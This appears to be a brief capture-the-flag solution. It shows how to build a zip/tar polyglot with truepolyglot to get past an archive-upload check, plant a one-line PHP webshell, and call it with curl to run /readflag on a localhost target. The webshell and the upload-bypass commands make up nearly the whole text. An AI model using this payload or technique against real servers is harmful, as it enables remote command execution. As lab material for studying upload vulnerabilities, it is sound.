Create a polyglot zip/tar file using truepolyglot and upload a webshell to execute /readflag

```sh
$ echo 'safe' > safe
$ zip safe.zip safe.txt
$ echo '<?php system($_GET["cmd"]) ?>' > exploit.php
$ touch $'PK\x03\x04'
$ tar -cf exploit.tar $'PK\x03\x04' exploit.php
$ truepolyglot zipany --payload1file exploit.tar --zipfile safe.zip exploit_polyglot.zip
```

After uploading:

```sh
$ curl http://localhost:3000/extracted/YOUR_UPLOAD_PATH/exploit.php?cmd=/readflag
```